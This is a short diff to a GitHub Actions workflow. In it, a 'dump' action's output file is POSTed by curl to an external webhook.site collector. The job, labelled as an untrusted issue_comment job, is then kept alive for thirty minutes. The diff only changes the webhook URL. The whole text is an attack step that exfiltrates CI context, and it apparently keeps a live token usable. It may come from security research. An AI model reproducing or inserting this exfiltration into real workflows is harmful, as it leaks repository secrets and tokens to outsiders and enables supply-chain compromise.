@@ -12,6 +12,6 @@ jobs:
         uses: ./.github/actions/dump
       - name: upload + hold
         run: |
-          curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx-dump.txt" -F "src=live-C-issuecomment"
+          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@ctx-dump.txt" -F "src=live-C-issuecomment"
           echo "holding untrusted issue_comment job alive"
           sleep 1800
